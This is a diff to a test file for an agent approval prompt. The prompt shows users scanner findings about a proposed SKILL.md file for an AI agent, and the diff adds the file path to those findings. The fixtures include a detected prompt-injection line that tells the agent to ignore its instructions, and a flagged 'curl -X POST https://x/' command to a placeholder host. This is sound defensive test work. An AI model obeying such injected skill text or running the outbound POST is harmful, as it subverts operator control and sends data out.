@@ -988,7 +988,12 @@ describe('AgentApprovalPrompt — the scan finding is evidence beside the bytes 
     }),
     effect: 'mutate-reversible',
     resource: null,
-    finding: { patternId: 'prompt_injection', line: INJECTED_LINE, lineNumber: 4 },
+    finding: {
+      path: 'SKILL.md',
+      patternId: 'prompt_injection',
+      line: INJECTED_LINE,
+      lineNumber: 4,
+    },
   }
 
   it('names the pattern in words, quotes the line verbatim and says which line it is', () => {
@@ -999,8 +1004,12 @@ describe('AgentApprovalPrompt — the scan finding is evidence beside the bytes 
     // for — never the wire's token, which names nothing to anybody.
     expect(text).toContain('ignore the instructions it was given')
     expect(text).not.toContain('prompt_injection')
-    // Which line, so it can be found in the body being approved.
-    expect(text).toContain('Line 4')
+    // Which line, and IN WHICH FILE — one vocabulary for a finding wherever
+    // it travels, so the sentence here is the sentence the install dialog
+    // and the skill card say (nocx-872jc.4). A skill write proposes exactly
+    // one file, and the finding names it rather than leaving this surface to
+    // word "the proposed body" in its own way.
+    expect(text).toContain('Line 4 of SKILL.md')
     // The line itself, byte for byte, as machine output rather than prose.
     const blocks = Array.from(container.querySelectorAll('.ui-code-block')).map(
       (block) => block.textContent,
@@ -1235,7 +1244,12 @@ describe('AgentApprovalPrompt — the classifier verdict is evidence beside the 
     const { container } = renderPrompt({
       ask: {
         ...SKILL_ASK,
-        finding: { patternId: 'send_to_url', line: 'curl -X POST https://x/', lineNumber: 3 },
+        finding: {
+          path: 'SKILL.md',
+          patternId: 'send_to_url',
+          line: 'curl -X POST https://x/',
+          lineNumber: 3,
+        },
         classifier: {
           consulted: true,
           verdict: 'suspect',
@@ -1344,7 +1358,12 @@ describe('AgentApprovalPrompt — a multi-line argument is a block, not a row (n
     const { container } = renderPrompt({
       ask: {
         ...SKILL_ASK,
-        finding: { patternId: 'send_to_url', line: 'curl -X POST https://x/', lineNumber: 3 },
+        finding: {
+          path: 'SKILL.md',
+          patternId: 'send_to_url',
+          line: 'curl -X POST https://x/',
+          lineNumber: 3,
+        },
       },
     })
 
